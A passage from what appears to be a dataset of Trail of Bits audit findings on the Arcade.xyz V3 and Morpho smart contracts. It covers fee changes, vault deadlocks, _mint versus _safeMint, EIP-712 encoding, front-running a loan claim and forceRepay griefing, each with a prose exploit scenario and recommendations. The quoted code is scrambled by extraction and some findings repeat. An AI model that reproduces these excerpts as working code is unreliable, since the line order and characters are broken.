causing distress and lack of trust in the team. Recommendations Short term, set a maximum boundary for the FL_09 fee in FeeControllers constructor. Long term, improve the test suite to ensure that all fee-changing functions test for out-of-bounds values for all fees, not just FL_02. 40 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "10. Fees can be changed while a loan is active ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "All fees in the protocol are calculated using the current fees, as informed by the FeeController contract. However, fees can be changed by the team at any time, so the eective rollover and closure fees that the users will pay can change once their loans are already initialized; therefore, these fees are impossible to know in advance. For example, in the code shown in gure 10.1, the LENDER_INTEREST_FEE and LENDER_PRINCIPAL_FEE values are read when a loan is about to be repaid, but these values can be dierent from the values the user agreed to when the loan was initialized. The same can happen in OriginationController and other functions in RepaymentController. function _prepareRepay(uint256 loanId) internal view returns (uint256 LoanLibrary.LoanData memory data = loanCore.getLoan(loanId); if (data.state == LoanLibrary.LoanState.DUMMY_DO_NOT_USE) revert if (data.state != LoanLibrary.LoanState.Active) revert 149 amountFromBorrower, uint256 amountToLender) { 150 151 RC_CannotDereference(loanId); 152 RC_InvalidState(data.state); 153 154 155 156 terms.proratedInterestRate); 157 158 BASIS_POINTS_DENOMINATOR; 159 BASIS_POINTS_DENOMINATOR; 160 161 162 163 } LoanLibrary.LoanTerms memory terms = data.terms; uint256 interest = getInterestAmount(terms.principal, uint256 interestFee = (interest * feeController.get(FL_07)) / uint256 principalFee = (terms.principal * feeController.get(FL_08)) / amountFromBorrower = terms.principal + interest; amountToLender = amountFromBorrower - interestFee - principalFee; Figure 10.1: The _prepareRepay function in arcade-protocol/contracts/RepaymentController.sol 41 Arcade.xyz V3 Security Assessment Exploit Scenario Lucy, the lender, and Bob, the borrower, agree on the current loan conditions and fees at a certain point in time. Some weeks later, when the time comes to repay the loan, they learn that the protocol team decided to change the fees while their loan was active. Lucys earnings are now dierent from what she expected. Recommendations Short term, consider storing (for example, in the LoanTerms structure) the fee values that both counterparties agree on when a loan is initialized, and use those local values for the full lifetime of the loan. Long term, document all of the conditions that are agreed on by the counterparties and that should be constant during the lifetime of the loan, and make sure they are preserved. Add a specic integration or fuzzing test for these conditions. 42 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "11. Asset vault nesting can lead to loss of assets ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "Allowing asset vaults to be nested (e.g., vault A is owned by vault B, and vault B is owned by vault X, etc.) could result in a situation in which multiple asset vaults own each other. This would result in a deadlock preventing assets in the aected asset vaults from ever being withdrawn again. Asset vaults are designed to hold dierent types of assets, including ERC-721 tokens. The ownership of an asset vault is tracked by an accompanying ERC-721 token that is minted (gure 11.1) when the asset vault is deployed through the VaultFactory contract. 164 (uint256) { 165 166 167 mintFee); 168 169 170 171 172 173 mintFee); 174 175 176 177 } function initializeBundle(address to) external payable override returns uint256 mintFee = feeController.get(FL_01); if (msg.value < mintFee) revert VF_InsufficientMintFee(msg.value, address vault = _create(); _mint(to, uint256(uint160(vault))); emit VaultCreated(vault, to); return uint256(uint160(vault)); if (msg.value > mintFee) payable(msg.sender).transfer(msg.value - Figure 11.1: The initializeBundle function in arcade-protocol/contracts/vault/VaultFactory.sol To add an ERC-721 asset to an asset vault, it needs to be transferred to the asset vaults address. Because the ownership of an asset vault is tracked by an ERC-721 token, it is possible to transfer the ownership of an asset vault to another asset vault by simply transferring the ERC-721 token representing vault ownership. To withdraw ERC-721 tokens from an asset vault, the owner (the holder of the asset vaults ERC-721 token) needs to 43 Arcade.xyz V3 Security Assessment enable withdrawals (using the enableWithdraw function) and then call the withdrawERC721 (or withdrawBatch) function. 121 122 123 124 150 151 152 153 154 155 156 function enableWithdraw() external override onlyOwner onlyWithdrawDisabled { withdrawEnabled = true; emit WithdrawEnabled(msg.sender); } Figure 11.2: The enableWithdraw function in arcade-protocol/contracts/vault/AssetVault.sol function withdrawERC721( address token, uint256 tokenId, address to ) external override onlyOwner onlyWithdrawEnabled { _withdrawERC721(token, tokenId, to); } Figure 11.3: The withdrawERC721 function in arcade-protocol/contracts/vault/AssetVault.sol Only the owner of an asset vault can enable and perform withdrawals. Therefore, if two (or more) vaults own each other, it would be impossible for a user to enable or perform withdrawals on the aected vaults, permanently locking all assets (ERC-721, ERC-1155, ERC-20, ETH) within them. The severity of the issue depends on the UI, which was out of scope for this review. If the UI does not prevent vaults from owning each other, the severity of this issue is higher. In terms of likelihood, this issue would require a user to make a mistake (although a mistake that is far more likely than the transfer of tokens to a random address) and would require the UI to fail to detect and prevent or warn the user from making such a mistake. We therefore rated the diculty of this issue as high. Exploit Scenario Alice decides to borrow USDC by putting up some of her NFTs as collateral: 1. Alice uses the UI to create an asset vault (vault A) and transfers ve of her CryptoPunks to the asset vault. 2. The UI shows that Alice has another existing vault (vault X), which contains two Bored Apes. She wants to use these two vaults together to borrow a higher amount of USDC. She clicks on vault A and selects the Add Asset option. 3. The UI shows a list of assets that Alice owns, including the ERC-721 token that represents ownership of vault X. Alice clicks on Add, the transaction succeeds, and the vault X NFT is transferred to vault A. Vault X is now owned by vault A. 44 Arcade.xyz V3 Security Assessment 4. Alice decides to add another Bored Ape NFT that she owns to vault X. She opens the vault X page and clicks on Add Assets, and the list of assets that she can add shows the ERC-721 token that represents ownership of vault A. 5. Alice is confused and wonders if adding vault X to vault A worked (step 3). She decides to add vault A to vault X instead. The transaction succeeds, and now vault A owns vault X and vice versa. Alice is now unable to withdraw any of the assets from either vault. Recommendations Short term, take one of the following actions:  Disallow the nesting of asset vaults. That is, prevent users from being able to transfer ownership of an asset vault to another asset vault. This would prevent the issue altogether.  If allowing asset vaults to be nested is a desired feature, update the UI to prevent two or more asset vaults from owning each other (if it does not already do so). Also, update the documentation so that other integrating smart contract protocols are aware of the issue. Long term, when dealing with the nesting of assets, consider edge cases and write extensive tests that ensure these edge cases are handled correctly and that users do not lose access to their assets. Other than unit tests, we recommend writing invariants and testing them using property-based testing with Echidna. 45 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "12. Risk of locked assets due to use of _mint instead of _safeMint ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "The asset vault and promissory note ERC-721 tokens are minted via the _mint function rather than the _safeMint function. The _safeMint function includes a necessary safety check that validates a recipient contracts ability to receive and handle ERC-721 tokens. Without this safeguard, tokens can inadvertently be sent to an incompatible contract, causing them, and any assets they hold, to become irretrievable. 164 (uint256) { 165 166 167 mintFee); 168 169 170 171 172 173 mintFee); 174 175 176 177 } function initializeBundle(address to) external payable override returns uint256 mintFee = feeController.get(FL_01); if (msg.value < mintFee) revert VF_InsufficientMintFee(msg.value, address vault = _create(); _mint(to, uint256(uint160(vault))); emit VaultCreated(vault, to); return uint256(uint160(vault)); if (msg.value > mintFee) payable(msg.sender).transfer(msg.value - Figure 12.1: The initializeBundle function in arcade-protocol/contracts/vault/VaultFactory.sol function mint(address to, uint256 loanId) external override returns (uint256) if (!hasRole(MINT_BURN_ROLE, msg.sender)) revert 135 { 136 PN_MintingRole(msg.sender); 137 138 139 140 return loanId; _mint(to, loanId); } Figure 12.2: The mint function in arcade-protocol/contracts/PromissoryNote.sol 46 Arcade.xyz V3 Security Assessment The _safeMint functions built-in safety check ensures that the recipient contract has the necessary ERC721Receiver implementation, verifying the contracts ability to receive and manage ERC-721 tokens. 258 259 260 261 262 263 264 265 266 267 268 function _safeMint( address to, uint256 tokenId, bytes memory _data ) internal virtual { _mint(to, tokenId); require( _checkOnERC721Received(address(0), to, tokenId, _data), \"ERC721: transfer to non ERC721Receiver implementer\" ); } Figure 12.3: The _safeMint function in openzeppelin-contracts/contracts/token/ERC721/ERC721.sol The _checkOnERC721Received method invokes the onERC721Received method on the receiving contract, expecting a return value containing the bytes4 selector of the onERC721Received method. A successful pass of this check implies that the contract is indeed capable of receiving and processing ERC-721 tokens. The _safeMint function does allow for reentrancy through the calling of _checkOnERC721Received on the receiver of the token. However, based on the order of operations in the aected functions in Arcade (gures 12.1 and 12.2), this poses no risk. Exploit Scenario Alice initializes a new asset vault by invoking the initializeBundle function of the VaultFactory contract, passing in her smart contract wallet address as the to argument. She transfers her valuable CryptoPunks NFT, intended to be used for collateral, to the newly created asset vault. However, she later discovers that her smart contract wallet lacks support for ERC-721 tokens. As a result, both her asset vault token and the CryptoPunks NFT become irretrievable, stuck within her smart wallet contract due to the absence of a mechanism to handle ERC-721 tokens. Recommendations Short term, use the _safeMint function instead of _mint in the PromissoryNote and VaultFactory contracts. The _safeMint function includes vital checks that ensure the recipient is equipped to handle ERC-721 tokens, thus mitigating the risk that NFTs could become frozen. Long term, enhance the unit testing suite. These tests should encompass more negative paths and potential edge cases, which will help uncover any hidden vulnerabilities or bugs like this one. Additionally, it is critical to test user-provided inputs extensively, covering a 47 Arcade.xyz V3 Security Assessment broad spectrum of potential scenarios. This rigorous testing will contribute to building a more secure, robust, and reliable system. 48 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "13. Borrowers cannot realize full loan value without risking default ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "To fully capitalize on their loans, borrowers need to retain their loaned assets and the owed interest for the entire term of their loans. However, if a borrower waits until the loans maturity date to repay it, they become immediately vulnerable to liquidation of their collateral by the lender. As soon as the block.timestamp value exceeds the dueDate value, a lender can invoke the claim function to liquidate the borrowers collateral. 293 294 295 // First check if the call is being made after the due date. uint256 dueDate = data.startDate + data.terms.durationSecs; if (dueDate >= block.timestamp) revert LC_NotExpired(dueDate); Figure 13.1: A snippet of the claim function in arcade-protocol/contracts/LoanCore.sol Owing to the inherent nature of the blockchain, achieving precise synchronization between the block.timestamp and the dueDate is practically impossible. Moreover, repaying a loan before the dueDate would result in a loss of some of the loans inherent value because the protocols interest assessment design does not refund any part of the interest for early repayment. In a scenario in which block.timestamp is greater than dueDate, a lender can preempt a borrowers loan repayment attempt, invoke the claim function, and liquidate the borrowers collateral. Frequently, collateral will be worth more than the loaned assets, giving lenders an incentive to do this. Given the protocols interest assessment design, the Arcade team should implement a grace period following the maturity date where no additional interest is expected to be assessed beyond the period agreed to in the loan terms. This buer would give the borrower an opportunity to fully capitalize on the term of their loan without the risk of defaulting and losing their collateral. 49 Arcade.xyz V3 Security Assessment Exploit Scenario Alice, a borrower, takes out a loan from Eve using Arcades NFT lending protocol. Alice deposits her rare CryptoPunk as collateral, which is more valuable than the assets loaned to her, so that her position is over-collateralized. Alice plans to hold on to the lent assets for the entire duration of the loan period in order to maximize her benet-to-cost ratio. Eve, the lender, is monitoring the blockchain for the moment when the block.timestamp is greater than or equal to the dueDate so that she can call the claim function and liquidate Alices CryptoPunk. As soon as the loan term is up, Alice submits a transaction to the repay function, and Eve front-runs that transaction with her own call to the claim function. As a result, Eve is able to liquidate Alices CryptoPunk collateral. Recommendations Short term, introduce a grace period after the loan's maturity date during which the lender cannot invoke the claim function. This buer would give the borrower sucient time to repay the loan without the risk of immediate collateral liquidation. Long term, revise the protocol's interest assessment design to allow a portion of the interest to be refunded in cases of early repayment. This change could reduce the incentive for borrowers to delay repayment until the last possible moment. Additionally, provide better education for borrowers on how the lending protocol works, particularly around critical dates and actions, and improve communication channels for borrowers to raise concerns or seek clarication. 50 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "14. itemPredicates encoded incorrectly according to EIP-712 ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "The itemPredicates parameter is not encoded correctly, so the signer cannot see the verier address when signing. The verier address receives each batch of listed assets to check them for correctness and existence, which is vital to ensuring the security and integrity of the lending transaction. According to EIP-712, structured data should be hashed in conjunction with its typeHash. The following is the hashStruct function as dened in EIP-712: hashStruct(s : ) = keccak256(typeHash  encodeData(s)) where typeHash = keccak256(encodeType(typeOf(s))) In the protocol, the recoverItemsSignature function hashes an array of Predicate[] structs that are passed in as the itemPredicates argument. The function encodes and hashes the array without adding the Predicate typeHash to each member of the array. The hashed output of that operation is then included in the _ITEMS_TYPEHASH variable as a bytes32 type, referred to as itemsHash. 208 209 210 211 212 213 214 (bytes32 sighash, address externalSigner) = recoverItemsSignature( loanTerms, sig, nonce, neededSide, keccak256(abi.encode(itemPredicates)) ); Figure 14.1: A snippet of the initializeLoanWithItems function in arcade-protocol/contracts/OriginationController.sol keccak256( bytes32 private constant _ITEMS_TYPEHASH = 85 86 87 88 proratedInterestRate,uint256 principal,address collateralAddress,bytes32 itemsHash,address payableCurrency,bytes32 affiliateCode,uint160 nonce,uint8 side)\" 89 // solhint-disable max-line-length \"LoanTermsWithItems(uint32 durationSecs,uint32 deadline,uint160 ); 51 Arcade.xyz V3 Security Assessment Figure 14.2: The _ITEMS_TYPEHASH variable in arcade-protocol/contracts/OriginationController.sol However, this method of encoding an array of structs is not consistent with the EIP-712 guidelines, which stipulates the following: The array values are encoded as the keccak256 hash of the concatenated encodeData of their contents (i.e., the encoding of SomeType[5] is identical to that of a struct containing ve members of type SomeType). The struct values are encoded recursively as hashStruct(value). This is undened for cyclical data. Therefore, the protocol should iterate over the itemPredicates array, encoding each Predicate instance separately with its respective typeHash. Exploit Scenario Alice creates a loan oering that takes CryptoPunks as collateral. She submits the loan terms to the Arcade protocol. Bob, a CryptoPunk holder, navigates the Arcade UI to accept Alices loan terms. An EIP-712 signature request appears in MetaMask for Bob to sign. Bob cannot validate whether the message he is signing uses the CryptoPunk verier contract because that information is not included in the hash. Recommendations Short term, adjust the encoding of itemPredicates to comply with EIP-712 standards. Have the code iterate through the itemPredicates array and encode each Predicate instance separately with its associated typeHash. Additionally, refactor the _ITEMS_TYPEHASH variable so that the Predicate typeHash denition is appended to it and replace the bytes32 itemsHash parameter with Predicate[] items. This revision will allow the signer to see the verier address of the message they are signing, ensuring the validity of each batch of items, in addition to complying with the EIP-712 standard. Long term, strictly adhere to established Ethereum protocols such as EIP-712. These standards exist to ensure interoperability, security, and predictable behavior in the Ethereum ecosystem. Violating these norms can lead to unforeseen security vulnerabilities. 52 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "15. The fee values can distort the incentives for the borrowers and lenders ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "Arcade V3 contains nine fee settings. Six of these fees are to be paid by the lender, two are to be paid by the borrower, and the remaining fee is to be paid by the borrower if they decide to mint a new vault for their collateral. Depending on the values of these settings, the incentives can change for both loan counterparties. For example, to create a new loan, both the borrower and lender have to pay origination fees, and eventually, the loan must be rolled over, repaid, or defaulted. In the rst case, both the new lender and borrower pay rollover fees; note that the original lender pays no fees at all for closing the loan. In the second case, the lender pays interest fees and principal fees on closing the loan. Finally, if the loan is defaulted, the lender pays a default fee to liquidate the collateral. The various fees paid based on the outcome of the loan can result in an interesting incentive game for investors in the protocol, depending on the actual values of the fee settings. If the lender rollover fee is cheaper than the origination fee, investors may be incentivized to roll over existing loans instead of creating new ones, beneting the original lenders by saving them the closing fees, and harming the borrowers by indirectly raising the interest rates to compensate. Similarly, if the lender rollover fees are higher than the closing fees, lenders will be less incentivized to rollover loans. In summary, having such ne control over possible fee settings introduces hard-to-predict incentives scenarios that can scare users away or cause users who do not account for fees to inadvertently lose prots. Recommendations Short term, clearly inform borrowers and lenders of all of the existing fees and their current values at the moment a loan is opened, as well as the various possible outcomes, including the expected net prots if the loan is repaid, rolled over, defaulted, or redeemed. Long term, add interactive ways for users to calculate their expected prots, such as a loan simulator. 53 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Di\u0000erent zero-address errors thrown by single and batch NFT withdrawal functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "The withdrawBatch function throws an error that is dierent from the single NFT withdrawal functions (withdrawERC721, withdrawERC1155). This could confuse users and other applications that interact with the Arcade contracts. The withdrawBatch function throws a custom error (AV_ZeroAddress) if the to parameter is set to the zero address. The single NFT withdrawal functions withdrawERC721 and withdrawERC1155 do not explicitly check the to parameter. All three of these functions internally call the _withdrawERC721 and _withdrawERC1155 functions, which also do not explicitly check the to parameter. The lack of such a check is not a problem: according to the ERC-721 and ERC-1155 standards, a transfer must revert if to is the zero address, so the single NFT withdrawal functions will revert on this condition. However, they will revert with the error message that is dened inside the actual NFT contract instead of the Arcade AV_ZeroAddress error, which is thrown when withdrawBatch reverts. ) external override onlyOwner onlyWithdrawEnabled { uint256 tokensLength = tokens.length; if (tokensLength > MAX_WITHDRAW_ITEMS) revert address[] calldata tokens, uint256[] calldata tokenIds, TokenType[] calldata tokenTypes, address to function withdrawBatch( 193 194 195 196 197 198 199 200 AV_TooManyItems(tokensLength); 201 202 AV_LengthMismatch(\"tokenType\"); 203 204 205 206 if (to == address(0)) revert AV_ZeroAddress(); for (uint256 i = 0; i < tokensLength; i++) { if (tokens[i] == address(0)) revert AV_ZeroAddress(); if (tokensLength != tokenIds.length) revert AV_LengthMismatch(\"tokenId\"); if (tokensLength != tokenTypes.length) revert 22 Arcade.xyz V3 Security Assessment Figure 1.1: A snippet of the withdrawBatch function in arcade-protocol/contracts/vault/AssetVault.sol Additionally, the CryptoPunks NFT contract does not follow the ERC-721 and ERC-1155 standards and contains no check that prevents funds from being transferred to the zero address (and the function is called transferPunk instead of the standard transfer). An explicit check to ensure that to is not the zero address inside the withdrawPunk function is therefore recommended. 114 115 116 117 118 119 120 121 122 123 124 125 126 it. 127 128 129 130 131 132 133 134 function transferPunk(address to, uint punkIndex) { if (!allPunksAssigned) throw; if (punkIndexToAddress[punkIndex] != msg.sender) throw; if (punkIndex >= 10000) throw; if (punksOfferedForSale[punkIndex].isForSale) { punkNoLongerForSale(punkIndex); } punkIndexToAddress[punkIndex] = to; balanceOf[msg.sender]--; balanceOf[to]++; Transfer(msg.sender, to, 1); PunkTransfer(msg.sender, to, punkIndex); // Check for the case where there is a bid from the new owner and refund // Any other bid can stay in place. Bid bid = punkBids[punkIndex]; if (bid.bidder == to) { // Kill bid and refund value pendingWithdrawals[to] += bid.value; punkBids[punkIndex] = Bid(false, punkIndex, 0x0, 0); } } Figure 1.2: The transferPunk function in CryptoPunksMarket contract (Etherscan) Lastly, there is no string argument to the AV_ZeroAddress error to indicate which variable equaled the zero address and caused the revert, unlike the AV_LengthMismatch error. For example, in the batch function (gure 1.1), the AV_ZeroAddress could be thrown in line 203 or 206. Exploit Scenario Bob, a developer of a front-end blockchain application that interacts with the Arcade contracts, develops a page that interacts with an AssetVault contract. In his implementation, he catches specic errors that are thrown so that he can show an informative message to the user. Because the batch and withdrawal functions throw dierent errors when to is the zero address, he needs to write two versions of error handlers instead of just one. 23 Arcade.xyz V3 Security Assessment Recommendations Short term, add the zero address check with the custom error to the _withdrawERC721 and _withdrawERC1155 functions. This will cause the same custom error to be thrown for all of the single and batch NFT withdrawal functions. Also, add an explicit zero-address check inside the withdrawPunk function. Lastly, add a string argument to the AV_ZeroAddress custom error that is used to indicate the name of the variable that triggered the error (similar to the one in AV_LengthMismatch). Long term, ensure consistency in the errors thrown throughout the implementation. This will allow users and developers to understand errors that are thrown and will allow the Arcade team to test fewer errors. 24 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "11. Asset vault nesting can lead to loss of assets ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "Allowing asset vaults to be nested (e.g., vault A is owned by vault B, and vault B is owned by vault X, etc.) could result in a situation in which multiple asset vaults own each other. This would result in a deadlock preventing assets in the aected asset vaults from ever being withdrawn again. Asset vaults are designed to hold dierent types of assets, including ERC-721 tokens. The ownership of an asset vault is tracked by an accompanying ERC-721 token that is minted (gure 11.1) when the asset vault is deployed through the VaultFactory contract. 164 (uint256) { 165 166 167 mintFee); 168 169 170 171 172 173 mintFee); 174 175 176 177 } function initializeBundle(address to) external payable override returns uint256 mintFee = feeController.get(FL_01); if (msg.value < mintFee) revert VF_InsufficientMintFee(msg.value, address vault = _create(); _mint(to, uint256(uint160(vault))); emit VaultCreated(vault, to); return uint256(uint160(vault)); if (msg.value > mintFee) payable(msg.sender).transfer(msg.value - Figure 11.1: The initializeBundle function in arcade-protocol/contracts/vault/VaultFactory.sol To add an ERC-721 asset to an asset vault, it needs to be transferred to the asset vaults address. Because the ownership of an asset vault is tracked by an ERC-721 token, it is possible to transfer the ownership of an asset vault to another asset vault by simply transferring the ERC-721 token representing vault ownership. To withdraw ERC-721 tokens from an asset vault, the owner (the holder of the asset vaults ERC-721 token) needs to 43 Arcade.xyz V3 Security Assessment enable withdrawals (using the enableWithdraw function) and then call the withdrawERC721 (or withdrawBatch) function. 121 122 123 124 150 151 152 153 154 155 156 function enableWithdraw() external override onlyOwner onlyWithdrawDisabled { withdrawEnabled = true; emit WithdrawEnabled(msg.sender); } Figure 11.2: The enableWithdraw function in arcade-protocol/contracts/vault/AssetVault.sol function withdrawERC721( address token, uint256 tokenId, address to ) external override onlyOwner onlyWithdrawEnabled { _withdrawERC721(token, tokenId, to); } Figure 11.3: The withdrawERC721 function in arcade-protocol/contracts/vault/AssetVault.sol Only the owner of an asset vault can enable and perform withdrawals. Therefore, if two (or more) vaults own each other, it would be impossible for a user to enable or perform withdrawals on the aected vaults, permanently locking all assets (ERC-721, ERC-1155, ERC-20, ETH) within them. The severity of the issue depends on the UI, which was out of scope for this review. If the UI does not prevent vaults from owning each other, the severity of this issue is higher. In terms of likelihood, this issue would require a user to make a mistake (although a mistake that is far more likely than the transfer of tokens to a random address) and would require the UI to fail to detect and prevent or warn the user from making such a mistake. We therefore rated the diculty of this issue as high. Exploit Scenario Alice decides to borrow USDC by putting up some of her NFTs as collateral:", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "16. Malicious borrowers can use forceRepay to grief lenders ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "A malicious borrower can grief a lender by calling the forceRepay function instead of the repay function; doing so would allow the borrower to pay less in gas fees and require the lender to perform a separate transaction to retrieve their funds (using the redeemNote function) and to pay a redeem fee. At any time after the loan is set and before the lender claims the collateral if the loan is past its due date, the borrower has to pay their full debt back in order to recover their assets. For doing so, there are two functions in RepaymentController: repay and forceRepay. The dierence between them is that the latter transfers the tokens to the LoanCore contract instead of directly to the lender. It is meant to allow the borrower to pay their obligations when the lender cannot receive tokens for any reason. For the lender to get their tokens back in this scenario, they must call the redeemNote function in RepaymentController, which in turn calls LoanCore.redeemNote, which transfers the tokens to an address set by the lender in the call. Because the borrower is free to decide which function to call to repay their debt, they can arbitrarily decide to do so via forceRepay, obligating the lender to send a transaction (with its associated gas fees) to recover their tokens. Additionally, depending on the conguration of the protocol, it is possible that the lender has to pay an additional fee (LENDER_REDEEM_FEE) to get back their own tokens, cutting their prots with no chance to opt out. 126 127 128 129 130 RC_InvalidState(data.state); 131 132 133 134 BASIS_POINTS_DENOMINATOR; function redeemNote(uint256 loanId, address to) external override { LoanLibrary.LoanData memory data = loanCore.getLoan(loanId); (, uint256 amountOwed) = loanCore.getNoteReceipt(loanId); if (data.state != LoanLibrary.LoanState.Repaid) revert address lender = lenderNote.ownerOf(loanId); if (lender != msg.sender) revert RC_OnlyLender(lender, msg.sender); uint256 redeemFee = (amountOwed * feeController.get(FL_09)) / 54 Arcade.xyz V3 Security Assessment 135 136 137 } loanCore.redeemNote(loanId, redeemFee, to); Figure 16.1: The redeemNote function in arcade-protocol/contracts/RepaymentController.sol Note that, from the perspective of the borrower, it is actually cheaper to call forceRepay than repay because of the gas saved by not transferring the tokens to the lender and not burning one of the promissory notes. Exploit Scenario Bob has to pay back his loan, and he decides to do so via forceRepay to save gas in the transaction. Lucy, the lender, wants her tokens back. She is now forced to call redeemNote to get them. In this transaction, she lost the gas fees that the borrower would have paid to send the tokens directly to her, and she has to pay an additional fee (LENDER_REDEEMER_FEE), causing her to receive less value from the loan than she originally expected. Recommendations Short term, remove the incentive (the lower gas cost) for the borrower to call forceRepay instead of repay. Consider taking one of the following actions:  Force the lender to always pull their funds using the redeemNote function. This can be achieved by removing the repay function and requiring the borrower to call forceRepay.  Remove the forceRepay function and modify the repay function so that it transfers the funds to the lender in a try/catch statement and creates a redeem note (which the lender can exchange for their funds using the redeemNote function) only if that transfer fails. Long term, when designing a smart contract protocol, always consider the incentives for each party to perform actions in the protocol, and avoid making an actor pay for the mistakes or maliciousness of others. By thoroughly documenting the incentives structure, aws can be spotted and mitigated before the protocol goes live. 55 Arcade.xyz V3 Security Assessment A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "1. Lack of two-step process for contract ownership changes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf", "body": "The owner of the IncentivesVault contract and other Ownable Morpho contracts can be changed by calling the transferOwnership function. This function internally calls the _transferOwnership function, which immediately sets the contracts new owner. Making such a critical change in a single step is error-prone and can lead to irrevocable mistakes. 13 contract IncentivesVault is IIncentivesVault, Ownable { Figure 1.1: Inheritance of contracts/compound/IncentivesVault.sol 62 function transferOwnership(address newOwner) public virtual onlyOwner { 63 64 65 } require(newOwner != address(0), \"Ownable: new owner is the zero address\"); _transferOwnership(newOwner); Figure 1.2: The transferOwnership function in @openzeppelin/contracts/access/Ownable.sol Exploit Scenario Bob, the IncentivesVault owner, invokes transferOwnership() to change the contracts owner but accidentally enters the wrong address. As a result, he permanently loses access to the contract. Recommendations Short term, for contract ownership transfers, implement a two-step process, in which the owner proposes a new address and the transfer is completed once the new address has executed a call to accept the role. Long term, identify and document all possible actions that can be taken by privileged accounts and their associated risks. This will facilitate reviews of the codebase and prevent future mistakes.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "2. Incomplete information provided in Withdrawn and Repaid events ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf", "body": "The core operations in the PositionsManager contract emit events with parameters that provide information about the operations actions. However, two events, Withdrawn and Repaid, do not provide complete information. For example, the withdrawLogic function, which performs withdrawals, takes a _supplier address (the user supplying the tokens) and _receiver address (the user receiving the tokens): /// @param _supplier The address of the supplier. /// @param _receiver The address of the user who will receive the tokens. /// @param _maxGasForMatching The maximum amount of gas to consume within a matching engine loop. function withdrawLogic( address _poolTokenAddress, uint256 _amount, address _supplier, address _receiver, uint256 _maxGasForMatching ) external Figure 2.1: The function signature of PositionsManagers withdrawLogic function However, the corresponding event in _safeWithdrawLogic records only the msg.sender of the transaction, so the _supplier and _receiver involved in the transaction are unclear. Moreover, if a withdrawal is performed as part of a liquidation operation, three separate addresses may be involvedthe _supplier, the _receiver, and the _user who triggered the liquidationand those monitoring events will have to cross-reference multiple events to understand whose tokens moved where. /// @notice Emitted when a withdrawal happens. /// @param _user The address of the withdrawer. /// @param _poolTokenAddress The address of the market from where assets are withdrawn. /// @param _amount The amount of assets withdrawn (in underlying). /// @param _balanceOnPool The supply balance on pool after update. /// @param _balanceInP2P The supply balance in peer-to-peer after update. event Withdrawn( address indexed _user,  Figure 2.2: The declaration of the Withdrawn event in PositionsManager emit Withdrawn( msg.sender, _poolTokenAddress, _amount, supplyBalanceInOf[_poolTokenAddress][msg.sender].onPool, supplyBalanceInOf[_poolTokenAddress][msg.sender].inP2P ); Figure 2.3: The emission of the Withdrawn event in the _safeWithdrawLogic function A similar issue is present in the _safeRepayLogic functions Repaid event. Recommendations Short term, add the relevant addresses to the Withdrawn and Repaid events. Long term, review all of the events emitted by the system to ensure that they emit sucient information.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "3. Missing access control check in withdrawLogic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf", "body": "The PositionsManager contracts withdrawLogic function does not perform any access control checks. In practice, this issue is not exploitable, as all interactions with this contract will be through delegatecalls with a hard-coded msg.sender sent from the main Morpho contract. However, if this code is ever reused or if the architecture of the system is ever modied, this guarantee may no longer hold, and users without the proper access may be able to withdraw funds. /// @dev Implements withdraw logic with security checks. /// @param _poolTokenAddress The address of the market the user wants to interact with. /// @param _amount The amount of token (in underlying). /// @param _supplier The address of the supplier. /// @param _receiver The address of the user who will receive the tokens. /// @param _maxGasForMatching The maximum amount of gas to consume within a matching engine loop. function withdrawLogic( address _poolTokenAddress, uint256 _amount, address _supplier, address _receiver, uint256 _maxGasForMatching ) external { Figure 3.1: The withdrawLogic function, which takes a supplier and whose comments note that it performs security checks Recommendations Short term, add a check to the withdrawLogic function to ensure that it withdraws funds only from the msg.sender. Long term, implement security checks consistently throughout the codebase.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "4. Lack of zero address checks in setter functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf", "body": "Certain setter functions fail to validate incoming arguments, so callers can accidentally set important state variables to the zero address. A mistake like this could initially go unnoticed because a delegatecall to an address without code will return success. /// @notice Sets the `positionsManager`. /// @param _positionsManager The new `positionsManager`. function setPositionsManager(IPositionsManager _positionsManager) external onlyOwner { positionsManager = _positionsManager; emit PositionsManagerSet(address(_positionsManager)); } Figure 4.1: An important address setter in MorphoGovernance Exploit Scenario Alice and 